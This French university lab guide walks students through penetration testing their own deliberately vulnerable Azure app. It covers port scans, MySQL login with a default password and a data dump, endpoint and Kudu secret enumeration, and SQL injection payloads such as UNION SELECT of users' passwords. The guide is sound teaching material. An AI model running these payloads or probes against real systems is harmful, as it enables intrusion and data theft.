# Guide de tests de pénétration - TD INF250
## Tests autorisés sur votre infrastructure Azure

⚠️ **ATTENTION : Tests autorisés UNIQUEMENT sur vos propres ressources Azure créées pour ce TD**

---

## Prérequis

```bash
# Définir vos variables d'environnement
export RG_NAME="rg-cocktail-unsecure-[VOTRE_NOM]"
export DB_NAME="cocktaildb-unsecure-[VOTRE_NOM]"
export API_NAME="cocktail-api-unsecure-[VOTRE_NOM]"
export FRONT_NAME="cocktail-front-unsecure-[VOTRE_NOM]"
```

---

## Test 1 : Scan de ports (Reconnaissance)

### Objectif
Identifier les ports ouverts et les services exposés

### Outils
- `nmap` (Network Mapper)
- Azure Network Watcher (via portail)

### Procédure

```bash
# Installation nmap (si nécessaire)
# Linux/Mac: sudo apt install nmap / brew install nmap
# Windows: télécharger depuis https://nmap.org

# 1. Scan de la base de données
echo "=== Scan de la base de données ==="
nmap -p 3306 -sV ${DB_NAME}.mysql.database.azure.com

# 2. Scan du backend API
echo "=== Scan du backend ==="
nmap -p 80,443,3001 -sV ${API_NAME}.azurewebsites.net

# 3. Scan du frontend
echo "=== Scan du frontend ==="
nmap -p 80,443 -sV ${FRONT_NAME}.azurewebsites.net

# 4. Scan complet (plus agressif)
nmap -p- -sV -A ${DB_NAME}.mysql.database.azure.com
```

### Résultats attendus (infrastructure vulnérable)

**Base de données :**
```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.21
```
✅ **Trouvaille :** Port 3306 ouvert = Vulnérabilité V01/V02

**Backend API :**
```
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
```
✅ **Trouvaille :** Ports web ouverts

### Rapport à rédiger

| Service | Port ouvert | Version détectée | Vulnérabilité | Criticité |
|---------|-------------|------------------|---------------|-----------|
| MySQL | 3306 | 8.0.21 | V__ : Exposition publique | CRITIQUE |
| Backend | 80, 443 | | V__ : __________________ | |
| Frontend | 80, 443 | | V__ : __________________ | |

---

## Test 2 : Tentative de connexion à la base de données

### Objectif
Vérifier si la base de données accepte les connexions depuis Internet

### Outils
- `mysql` client

### Procédure

```bash
# Test de connexion avec les credentials par défaut
echo "=== Test de connexion MySQL ==="

# Tentative 1 : Connexion standard (devrait réussir sur infra vulnérable)
mysql -h ${DB_NAME}.mysql.database.azure.com \
      -u dbadmin \
      -p'P@ssword123!' \
      --ssl-mode=DISABLED \
      -e "SELECT 'CONNEXION RÉUSSIE - VULNÉRABILITÉ CRITIQUE' AS Status;"

# Tentative 2 : Lister les bases de données
mysql -h ${DB_NAME}.mysql.database.azure.com \
      -u dbadmin \
      -p'P@ssword123!' \
      --ssl-mode=DISABLED \
      -e "SHOW DATABASES;"

# Tentative 3 : Lister les tables
mysql -h ${DB_NAME}.mysql.database.azure.com \
      -u dbadmin \
      -p'P@ssword123!' \
      --ssl-mode=DISABLED \
      cocktails \
      -e "SHOW TABLES;"

# Tentative 4 : Exfiltrer des données (SIMULATION)
mysql -h ${DB_NAME}.mysql.database.azure.com \
      -u dbadmin \
      -p'P@ssword123!' \
      --ssl-mode=DISABLED \
      cocktails \
      -e "SELECT * FROM cocktails LIMIT 5;"
```

### Résultats attendus

**Si SUCCÈS (infrastructure vulnérable) :**
```
+-----------------------------------+
| Status                             |
+-----------------------------------+
| CONNEXION RÉUSSIE - VULNÉRABILITÉ CRITIQUE |
+-----------------------------------+
```

✅ **Trouvaille :** Accès direct à la base de données depuis Internet = **CRITIQUE**

**Si ÉCHEC (infrastructure sécurisée) :**
```
ERROR 2003 (HY000): Can't connect to MySQL server on 'xxx' (110)
```

✅ **Validation :** La base de données est correctement isolée

### Rapport à rédiger

**Vulnérabilité détectée :**
- **ID :** V01
- **Titre :** Base de données MySQL accessible publiquement
- **Preuve :** Connexion réussie depuis poste externe (capture d'écran à joindre)
- **Impact :** 
  - Exfiltration de données
  - Modification/suppression de données
  - Ransomware possible
- **CVSS Score :** 9.8 (CRITIQUE)

---

## Test 3 : Énumération des endpoints API

### Objectif
Découvrir les endpoints exposés et tester les accès non autorisés

### Outils
- `curl`
- Burp Suite Community (optionnel)

### Procédure

```bash
# 1. Test endpoint public
echo "=== Test endpoints API ==="
curl -v https://${API_NAME}.azurewebsites.net/

# 2. Énumération des routes communes
echo "=== Énumération des routes ==="

# Routes potentiellement sensibles
for route in api health admin users config env .env api/users api/admin api/config api/cocktails; do
    echo "Testing /$route"
    curl -s -o /dev/null -w "%{http_code} - /$route\n" https://${API_NAME}.azurewebsites.net/$route
done

# 3. Test de méthodes HTTP
echo "=== Test méthodes HTTP ==="
curl -X GET https://${API_NAME}.azurewebsites.net/api/cocktails
curl -X POST https://${API_NAME}.azurewebsites.net/api/cocktails -d '{}'
curl -X DELETE https://${API_NAME}.azurewebsites.net/api/cocktails/1

# 4. Test d'accès aux secrets (Kudu)
echo "=== Test accès Kudu (console avancée) ==="
curl -I https://${API_NAME}.scm.azurewebsites.net/
curl -I https://${API_NAME}.scm.azurewebsites.net/Env.cshtml
```

### Résultats attendus

**Codes HTTP à analyser :**
- `200 OK` : Endpoint accessible
- `403 Forbidden` : Endpoint existe mais accès refusé
- `404 Not Found` : Endpoint n'existe pas
- `401 Unauthorized` : Authentification requise

**Exemple de sortie :**
```
200 - /api/cocktails      ✅ Accessible
200 - /api/users          ⚠️ Fuite d'info possible
403 - /admin              ⚠️ Endpoint existe
404 - /.env               ✅ Non trouvé
200 - /Env.cshtml         ❌ CRITIQUE - Secrets exposés
```

### Rapport à rédiger

| Endpoint | Code HTTP | Données exposées | Vulnérabilité | Criticité |
|----------|-----------|------------------|---------------|-----------|
| /api/cocktails | 200 | Liste publique | V__ : _______ | MINEUR |
| /api/users | | | V__ : _______ | |
| /Env.cshtml | | | V__ : _______ | |

---

## Test 4 : Analyse des headers de sécurité HTTP

### Objectif
Vérifier la présence des headers de sécurité

### Procédure

```bash
# Analyser les headers de réponse
echo "=== Analyse headers de sécurité ==="

curl -I https://${API_NAME}.azurewebsites.net/ | grep -E "Strict-Transport-Security|X-Content-Type-Options|X-Frame-Options|Content-Security-Policy|X-XSS-Protection"
```

### Headers attendus (infrastructure sécurisée)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
```

### Rapport à rédiger

| Header de sécurité | Présent ? | Valeur | Conforme ? |
|-------------------|-----------|--------|------------|
| Strict-Transport-Security | ☐ OUI ☐ NON | | ☐ OUI ☐ NON |
| X-Content-Type-Options | ☐ OUI ☐ NON | | ☐ OUI ☐ NON |
| X-Frame-Options | ☐ OUI ☐ NON | | ☐ OUI ☐ NON |
| Content-Security-Policy | ☐ OUI ☐ NON | | ☐ OUI ☐ NON |

---

## Test 5 : Injection SQL (simulation)

### Objectif
Tester la vulnérabilité aux injections SQL

⚠️ **Test à effectuer UNIQUEMENT sur votre propre infrastructure**

### Procédure

```bash
# Test injection SQL basique
echo "=== Test injection SQL ==="

# Payload 1 : OR 1=1
curl "https://${API_NAME}.azurewebsites.net/api/cocktails?id=1' OR '1'='1"

# Payload 2 : UNION SELECT
curl "https://${API_NAME}.azurewebsites.net/api/cocktails?id=1' UNION SELECT NULL,username,password FROM users--"

# Payload 3 : Time-based blind
curl "https://${API_NAME}.azurewebsites.net/api/cocktails?id=1' AND SLEEP(5)--"
```

### Résultats à analyser

**Si vulnérable :**
- La requête retourne plus de données que prévu
- Erreur SQL visible dans la réponse
- Délai de réponse anormal (time-based)

**Si protégé :**
- Erreur générique sans détails SQL
- WAF bloque la requête (403 Forbidden)
- Paramètres correctement échappés

### Rapport à rédiger

**Si vulnérabilité détectée :**
- **ID :** V__
- **Titre :** Injection SQL possible sur endpoint /api/cocktails
- **Payload utilisé :** `[copier le payload]`
- **Réponse obtenue :** `[capture d'écran]`
- **Impact :** Accès non autorisé aux données, modification, dump de la base

---

## Test 6 : Vérification du chiffrement SSL/TLS

### Objectif
Vérifier la configuration SSL/TLS

### Outils
- `testssl.sh` (recommandé)
- `openssl`
- SSL Labs (online)

### Procédure

```bash
# Test avec openssl
echo "=== Test SSL/TLS ==="

# Vérifier la version TLS supportée
openssl s_client -connect ${DB_NAME}.mysql.database.azure.com:3306 -tls1_2

# Tester les ciphers faibles
openssl s_client -connect ${API_NAME}.azurewebsites.net:443 -cipher 'DES-CBC3-SHA'

# Avec testssl.sh (si installé)
./testssl.sh https://${API_NAME}.azurewebsites.net
```

### Rapport à rédiger

| Service | TLS Version | Ciphers faibles | Certificat valide | Conforme |
|---------|-------------|-----------------|-------------------|----------|
| Database | TLS 1.0/1.1/1.2/1.3 | ☐ OUI ☐ NON | ☐ OUI ☐ NON | ☐ OUI ☐ NON |
| Backend | | | | |
| Frontend | | | | |

---

## Test 7 : Analyse des logs et détection

### Objectif
Vérifier si vos tests sont détectés et journalisés

### Procédure

```bash
# Vérifier les logs App Service
az monitor activity-log list \
  --resource-group $RG_NAME \
  --max-events 50

# Vérifier les logs de diagnostic
az monitor diagnostic-settings list \
  --resource $(az mysql flexible-server show --resource-group $RG_NAME --name $DB_NAME --query id -o tsv)
```

### Questions à répondre

- [ ] Vos tentatives de connexion à la base de données sont-elles journalisées ?
- [ ] Les scans de ports déclenchent-ils des alertes ?
- [ ] Les tentatives d'injection SQL sont-elles détectées ?
- [ ] Existe-t-il un SIEM pour analyser les logs ?

**Si aucun log n'est trouvé :**
✅ **Vulnérabilité V__ :** Absence de monitoring et de détection d'intrusion

---

## Synthèse des tests

### Tableau récapitulatif

| Test | Objectif | Résultat | Vulnérabilité | Criticité | Documenté |
|------|----------|----------|---------------|-----------|-----------|
| 1. Scan de ports | Découvrir services exposés | ☐ Réussi ☐ Bloqué | V__ | | ☐ |
| 2. Connexion DB | Accès non autorisé | ☐ Réussi ☐ Bloqué | V__ | | ☐ |
| 3. Énumération API | Découvrir endpoints | ☐ Réussi ☐ Bloqué | V__ | | ☐ |
| 4. Headers sécurité | Vérifier protection | ☐ Absent ☐ Présent | V__ | | ☐ |
| 5. Injection SQL | Exploiter faille | ☐ Réussi ☐ Bloqué | V__ | | ☐ |
| 6. SSL/TLS | Vérifier chiffrement | ☐ Faible ☐ Fort | V__ | | ☐ |
| 7. Logs/Alertes | Détection intrusion | ☐ Absent ☐ Présent | V__ | | ☐ |

---

## Preuves à collecter

Pour chaque test, collectez :

1. **Capture d'écran** de la commande et du résultat
2. **Copie du texte** de sortie (stdout/stderr)
3. **Timestamp** du test
4. **Code de retour** HTTP ou erreur

### Exemple de preuve

```
=== PREUVE - Test 2 : Connexion base de données ===
Date: 2025-01-14 10:32:15
Commande: mysql -h cocktaildb-unsecure-xxx.mysql.database.azure.com -u dbadmin -p
Résultat: CONNEXION RÉUSSIE

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| cocktails          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

VULNÉRABILITÉ CONFIRMÉE : Accès direct depuis Internet
```

---

## Règles éthiques

### ✅ AUTORISÉ
- Tests sur VOS ressources Azure créées pour le TD
- Scan de ports
- Tentative de connexion avec credentials fournis
- Énumération d'endpoints publics
- Tests d'injection (sur votre infra uniquement)

### ❌ INTERDIT
- Tests sur d'autres ressources Azure
- Tests sur des systèmes tiers
- Déni de service (DoS)
- Exfiltration de données réelles
- Modification de données en production

---

## Nettoyage après tests

```bash
# Vérifier qu'aucune connexion n'est restée ouverte
mysql -h ${DB_NAME}.mysql.database.azure.com -u dbadmin -p -e "SHOW PROCESSLIST;"

# Fermer toutes les sessions
# (normalement géré automatiquement)
```

---
